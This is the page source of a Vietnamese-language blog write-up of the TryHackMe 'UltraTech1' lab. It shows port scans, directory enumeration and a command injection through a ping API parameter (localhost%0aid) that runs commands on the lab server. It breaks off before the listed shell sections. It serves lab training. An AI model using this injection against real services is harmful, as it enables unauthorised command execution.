@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <meta name="google-site-verification" content="Txr_ZAJ6seUhm2Y9s8eRpRy2qOSdUO9A_9jfLLn_bPw">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"guyintheclouds.com","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.23.1","exturl":false,"sidebar":{"position":"right","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="OverviewLink: https:&#x2F;&#x2F;tryhackme.com&#x2F;room&#x2F;ultratech1Difficulty: Medium (Nhưng thực ra khá dễ)Mở ra Task 1 có phầm mở đầu khá dài, anh em thích đọc thì đọc, còn không thì nhấn vào cái nút Deploy màu xa">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[TryHackMe] UltraTech1">
+<meta property="og:url" content="https://guyintheclouds.com/2021/01/25/ultratech1-tryhackme/index.html">
+<meta property="og:site_name" content="Guy_in_the_clouds">
+<meta property="og:description" content="OverviewLink: https:&#x2F;&#x2F;tryhackme.com&#x2F;room&#x2F;ultratech1Difficulty: Medium (Nhưng thực ra khá dễ)Mở ra Task 1 có phầm mở đầu khá dài, anh em thích đọc thì đọc, còn không thì nhấn vào cái nút Deploy màu xa">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://guyintheclouds.com/banner/ultratech1-tryhackme.png">
+<meta property="og:image" content="https://guyintheclouds.com/2021/01/25/ultratech1-tryhackme/pic1.png">
+<meta property="og:image" content="https://guyintheclouds.com/2021/01/25/ultratech1-tryhackme/pic2.png">
+<meta property="og:image" content="https://guyintheclouds.com/2021/01/25/ultratech1-tryhackme/pic3.png">
+<meta property="article:published_time" content="2021-01-25T09:22:59.000Z">
+<meta property="article:modified_time" content="2025-06-14T14:58:22.611Z">
+<meta property="article:author" content="minhnq22">
+<meta property="article:tag" content="write up">
+<meta property="article:tag" content="medium">
+<meta property="article:tag" content="tryhackme">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://guyintheclouds.com/banner/ultratech1-tryhackme.png">
+
+
+<link rel="canonical" href="https://guyintheclouds.com/2021/01/25/ultratech1-tryhackme/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://guyintheclouds.com/2021/01/25/ultratech1-tryhackme/","path":"2021/01/25/ultratech1-tryhackme/","title":"[TryHackMe] UltraTech1"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>[TryHackMe] UltraTech1 | Guy_in_the_clouds</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/11.1.0/firebase-app-compat.js" integrity="sha256-k2eD8Bl04gp35v4S01cNbO+3UeLK6mVqpOyUJz4aXzY=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/11.1.0/firebase-firestore-compat.js" integrity="sha256-r1EpenNle+MZs+KB73PFJnrmIF3k29t5XGrSqfZ9PPw=" crossorigin="anonymous" defer></script>
+  <script class="next-config" data-name="firestore" type="application/json">{"enable":true,"collection":"articles","apiKey":"AIzaSyDP3hkyO3EkkJ4jY-xQFQ7J2HKYiNu6ay0","projectId":"guyintheclouds-a8920"}</script>
+  <script src="/js/third-party/statistics/firestore.js" defer></script>
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Guy_in_the_clouds</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description"># cat knowledge >> /dev/brain 2> /proc/mind</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="Searching..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Overview"><span class="nav-number">1.</span> <span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Information-Gathering"><span class="nav-number">2.</span> <span class="nav-text">Information Gathering</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Nmap"><span class="nav-number">2.1.</span> <span class="nav-text">Nmap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Dirsearch"><span class="nav-number">2.2.</span> <span class="nav-text">Dirsearch</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#API-Command-Injection"><span class="nav-number">2.3.</span> <span class="nav-text">API Command Injection</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Get-User-Shell"><span class="nav-number">3.</span> <span class="nav-text">Get User Shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Get-Root-Shell"><span class="nav-number">4.</span> <span class="nav-text">Get Root Shell</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="minhnq22"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">minhnq22</p>
+  <div class="site-description" itemprop="description"><i>Tác giả blog này là một người viển vông và thiếu thực tế, hay còn được gọi là người giời.</i></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">19</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="mailto:quangminhnguyen2201@gmail.com" title="E-Mail → mailto:quangminhnguyen2201@gmail.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://github.com/minhnq22" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;minhnq22" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.linkedin.com/in/minhnq22" title="Linkedin → https:&#x2F;&#x2F;www.linkedin.com&#x2F;in&#x2F;minhnq22" rel="noopener me" target="_blank"><i class="fab fa-linkedin fa-fw"></i>Linkedin</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.topcv.vn/xem-cv/BAYIA1QLUwYHBVFWUFBVAgdUAgcOBwBUDAcCUw7e64" title="CV → https:&#x2F;&#x2F;www.topcv.vn&#x2F;xem-cv&#x2F;BAYIA1QLUwYHBVFWUFBVAgdUAgcOBwBUDAcCUw7e64" rel="noopener me" target="_blank"><i class="fa fa-bed fa-fw"></i>CV</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://guyintheclouds.com/2021/01/25/ultratech1-tryhackme/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="minhnq22">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Guy_in_the_clouds">
+      <meta itemprop="description" content="<i>Tác giả blog này là một người viển vông và thiếu thực tế, hay còn được gọi là người giời.</i>">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="[TryHackMe] UltraTech1 | Guy_in_the_clouds">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          [TryHackMe] UltraTech1
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-01-25 16:22:59" itemprop="dateCreated datePublished" datetime="2021-01-25T16:22:59+07:00">2021-01-25</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/TryHackMe/" itemprop="url" rel="index"><span itemprop="name">TryHackMe</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="Views">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">Views: </span>
+      <span class="firestore-visitors-count"></span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>10 mins.</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p><img src="/banner/ultratech1-tryhackme.png"></p>
+<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>Link: <a target="_blank" rel="noopener" href="https://tryhackme.com/room/ultratech1">https://tryhackme.com/room/ultratech1</a><br>Difficulty: Medium (Nhưng thực ra khá dễ)<br>Mở ra Task 1 có phầm mở đầu khá dài, anh em thích đọc thì đọc, còn không thì nhấn vào cái nút Deploy màu xanh kia mà bắt đầu cho đỡ mất thời gian.</p>
+<span id="more"></span>
+<p>TryHackMe mỗi lần Deploy sẽ ra một địa chỉ IP Lab khác nhau, nếu cảm thấy may mắn có thể đem mấy con số đó đi đánh đề.<br>Lần này con số may mắn của tôi là 10.10.3.122, tiếc cái lúc này đã quá 18h30 nên không còn tiết mục quay số xanh đỏ nữa, hmm…</p>
+<h2 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -A -v 10.10.3.122 </span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">21/tcp   open  ftp     vsftpd 3.0.3</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)</span><br><span class="line">|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)</span><br><span class="line">|_  256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519)</span><br><span class="line">8081/tcp open  http    Node.js Express framework</span><br><span class="line">|_http-cors: HEAD GET POST PUT DELETE PATCH</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html; charset=utf-8).</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+<p>Trước mắt là vớ được 3 cổng 21-FTP, 22-SSH và 8081-HTTP, theo sau là phiên bản của từng dịch vụ chạy trên các cổng đó.<br>Tất nhiên nếu dùng option -A của nmap thì chỉ mới phát hiện được các cổng tiêu biểu, chứ chưa thể liệt kê được tất cả các cổng đang được mở public trên server.<br>Để ý trong câu hỏi thuộc Task 2, có câu <em>Which other non-standard port is used?</em> và câu trả lời bên dưới có dạng *****, nghĩa là cổng này có 5 chữ số, trong khoảng từ 10000-65535, việc cần làm là phải tìm ra nó cái đã. Lại Nmap thôi :D</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -p 10000-65535 -T5 10.10.3.122</span><br><span class="line">PORT      STATE    SERVICE</span><br><span class="line">...</span><br><span class="line">31070/tcp filtered unknown</span><br><span class="line">31146/tcp filtered unknown</span><br><span class="line">31331/tcp open     unknown</span><br><span class="line">31396/tcp filtered unknown</span><br><span class="line">31610/tcp filtered unknown</span><br><span class="line">31777/tcp filtered unknown</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>Lúc chờ script này hoàn thành, tôi đã xem được hết trận Navi với Astralis.<br>Tóm được cổng 31331 đang mở, trốn kỹ đấy tml. Giờ thì xem xem thế lực nào đứng đằng sau nó.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -p 31331 -sC -sV 10.10.3.122  </span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)</span><br></pre></td></tr></table></figure>
+<p>Apache! Server này đang chạy 2 cổng HTTP, méo biết để làm gì. Mở cả 2 cái web của nó lên xem thế nào đã.<br><img src="/2021/01/25/ultratech1-tryhackme/pic1.png"><br><img src="/2021/01/25/ultratech1-tryhackme/pic2.png"></p>
+<h3 id="Dirsearch"><a href="#Dirsearch" class="headerlink" title="Dirsearch"></a>Dirsearch</h3><p>Chạy dirsearch với cổng 8081.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ ./dirsearch.py -e php,txt,html -u http://10.10.3.122:8081/</span><br><span class="line"></span><br><span class="line">[22:03:13] Starting: </span><br><span class="line">[22:03:53] 200 -   39B  - /auth</span><br><span class="line">[22:03:53] 200 -   39B  - /auth/</span><br><span class="line">[22:04:26] 500 -    1KB - /ping</span><br><span class="line"></span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure>
+<p>Truy cập vào &#x2F;auth&#x2F;, có thông báo <em>You must specify a login and a password</em>, có thể hình dung đây là một API, và cổng 8081 được dùng để chạy cung cấp API cho web server cổng 31331.<br>Thử thêm param vào cho API &#x2F;auth (<a target="_blank" rel="noopener" href="http://10.10.3.122:8081/auth/?login=admin&password=admin">http://10.10.3.122:8081/auth/?login=admin&amp;password=admin</a>), nhận lại vỏn vẹn dòng <em>Invalid credentials</em>. Okay :(<br>Còn với ping thì sao (<a target="_blank" rel="noopener" href="http://10.10.3.122:8081/ping">http://10.10.3.122:8081/ping</a>)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">TypeError: Cannot read property &#x27;replace&#x27; of undefined</span><br><span class="line">    at app.get (/home/www/api/index.js:45:29)</span><br><span class="line">    at Layer.handle [as handle_request] (/home/www/api/node_modules/express/lib/router/layer.js:95:5)</span><br><span class="line">    at next (/home/www/api/node_modules/express/lib/router/route.js:137:13)</span><br><span class="line">    at Route.dispatch (/home/www/api/node_modules/express/lib/router/route.js:112:3)</span><br><span class="line">    at Layer.handle [as handle_request] (/home/www/api/node_modules/express/lib/router/layer.js:95:5)</span><br><span class="line">    at /home/www/api/node_modules/express/lib/router/index.js:281:22</span><br><span class="line">    at Function.process_params (/home/www/api/node_modules/express/lib/router/index.js:335:12)</span><br><span class="line">    at next (/home/www/api/node_modules/express/lib/router/index.js:275:10)</span><br><span class="line">    at cors (/home/www/api/node_modules/cors/lib/index.js:188:7)</span><br><span class="line">    at /home/www/api/node_modules/cors/lib/index.js:224:17</span><br></pre></td></tr></table></figure>
+<p>Lỗi trả về cho thấy API đang yêu cầu param, nhưng đéo ai biết param nó đang cần là gì. Với hình dung là việc API này cung cấp dịch vụ Ping, tôi nghĩ đến việc có thể lợi dụng nó để chèn lệnh (Command Injection) và lấy shell. Mường tượng ra là như thế, giờ phải đi tìm cách để sử dụng cái API Ping này cái đã.<br>Quay lại với web server trên cổng 31331, khá chắc kèo là ở đây sẽ có đoạn code nào đó để gọi các API mà phía cổng 8081 cung cấp, từ đây có thể xác định được param cần thiết cho API là gì.<br>Chạy dirsearch trên cổng 31331.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">./dirsearch.py -e php,txt,html -u http://10.10.3.122:31331/</span><br><span class="line"></span><br><span class="line">[22:14:10] 301 -  317B  - /css  -&gt;  http://10.10.3.122:31331/css/</span><br><span class="line">[22:14:16] 200 -   15KB - /favicon.ico</span><br><span class="line">[22:14:19] 301 -  320B  - /images  -&gt;  http://10.10.3.122:31331/images/</span><br><span class="line">[22:14:19] 200 -    4KB - /images/</span><br><span class="line">[22:14:20] 200 -    6KB - /index.html</span><br><span class="line">[22:14:21] 301 -  324B  - /javascript  -&gt;  http://10.10.3.122:31331/javascript/</span><br><span class="line">[22:14:22] 301 -  316B  - /js  -&gt;  http://10.10.3.122:31331/js/</span><br><span class="line">[22:14:22] 200 -    1KB - /js/</span><br><span class="line">[22:14:39] 200 -   53B  - /robots.txt</span><br><span class="line">[22:14:40] 403 -  302B  - /server-status</span><br><span class="line">[22:14:40] 403 -  303B  - /server-status/</span><br><span class="line"></span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure>
+<p>Tìm kiếm trong các thư mục có status 200. Các thư mục như &#x2F;css&#x2F;, &#x2F;images&#x2F;, &#x2F;javascript&#x2F;, &#x2F;js&#x2F; thì thường tôi hay bị bỏ qua. Hoặc có vào thì cũng chỉ xem lướt lướt. Cơ mà lần này do đéo biết mò mẫm ở đâu để kiếm thêm thông tin nữa, nên tôi mở chúng lên xem.<br>Có một điều lạ, là &#x2F;javascript&#x2F; và &#x2F;js&#x2F;, ủa, js là viết tắt của javascript mà, sao lại phải chia ra làm 2 thư mục? Truy cập vào để thấy điều hay ho, &#x2F;javascript&#x2F; từ chối truy cập, còn &#x2F;js&#x2F; thì tèn ten…</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Parent Directory	 </span><br><span class="line">[ ]	api.js      2019-03-22 18:06 	883</span><br><span class="line">[ ]	app.js      2019-03-22 18:06    43K</span><br><span class="line">[ ]	app.min.js  2019-03-22 18:06    19K</span><br></pre></td></tr></table></figure>
+<p>Và api.js</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">(function() &#123;</span><br><span class="line">    console.warn(&#x27;Debugging ::&#x27;);</span><br><span class="line"></span><br><span class="line">    function getAPIURL() &#123;</span><br><span class="line">	return `$&#123;window.location.hostname&#125;:8081`</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function checkAPIStatus() &#123;</span><br><span class="line">	const req = new XMLHttpRequest();</span><br><span class="line">	try &#123;</span><br><span class="line">	    const url = `http://$&#123;getAPIURL()&#125;/ping?ip=$&#123;window.location.hostname&#125;`</span><br><span class="line">	    req.open(&#x27;GET&#x27;, url, true);</span><br><span class="line">	    req.onload = function (e) &#123;</span><br><span class="line">		if (req.readyState === 4) &#123;</span><br><span class="line">		    if (req.status === 200) &#123;</span><br><span class="line">			console.log(&#x27;The api seems to be running&#x27;)</span><br><span class="line">		    &#125; else &#123;</span><br><span class="line">			console.error(req.statusText);</span><br><span class="line">		    &#125;</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;;</span><br><span class="line">	    req.onerror = function (e) &#123;</span><br><span class="line">		console.error(xhr.statusText);</span><br><span class="line">	    &#125;;</span><br><span class="line">	    req.send(null);</span><br><span class="line">	&#125;</span><br><span class="line">	catch (e) &#123;</span><br><span class="line">	    console.error(e)</span><br><span class="line">	    console.log(&#x27;API Error&#x27;);</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    checkAPIStatus()</span><br><span class="line">    const interval = setInterval(checkAPIStatus, 10000);</span><br><span class="line">    const form = document.querySelector(&#x27;form&#x27;)</span><br><span class="line">    form.action = `http://$&#123;getAPIURL()&#125;/auth`;</span><br><span class="line">    </span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
+<p>Ở trên có thể thấy param của API này là “ip”. Nói đến đoạn này tôi cũng thấy mình ngu, ping thì chỉ có ping ip, domain thôi, chứ ai đi ping con gà con vịt? Thế mà đéo thử từ đầu cho đỡ mất thời gian.</p>
+<h3 id="API-Command-Injection"><a href="#API-Command-Injection" class="headerlink" title="API Command Injection"></a>API Command Injection</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.3.122:8081/ping?ip=localhost</span><br><span class="line"></span><br><span class="line">PING localhost(localhost6.localdomain6 (::1)) 56 data bytes 64 bytes from localhost6.localdomain6 (::1): icmp_seq=1 ttl=64 time=0.016 ms --- localhost ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 0.016/0.016/0.016/0.000 ms </span><br></pre></td></tr></table></figure>
+<p>Chạy mượt ngay &#x3D;)) ping localhost mà không mượt thì thôi đấy. Thử chèn lệnh các kiểu xem sao.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.3.122:8081/ping?ip=localhost%0aid</span><br><span class="line"></span><br><span class="line">PING localhost(localhost6.localdomain6 (::1)) 56 data bytes 64 bytes from localhost6.localdomain6 (::1): icmp_seq=1 ttl=64 time=0.017 ms --- localhost ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 0.017/0.017/0.017/0.000 ms</span><br><span class="line">uid=1002(www) gid=1002(www) groups=1002(www) </span><br></pre></td></tr></table></figure>
+<p>Toang, dấu phân tách ở đây tôi dùng là %0a, tương ứng với ký tự ngắt dòng.<br>Từ đoạn này tôi quay sang dùng Postman để gọi API, anh em có thể dùng Burp Suite, nó cũng chả khác mẹ gì trình duyệt đâu, chỉ là hiển thị cho đẹp thôi.</p>
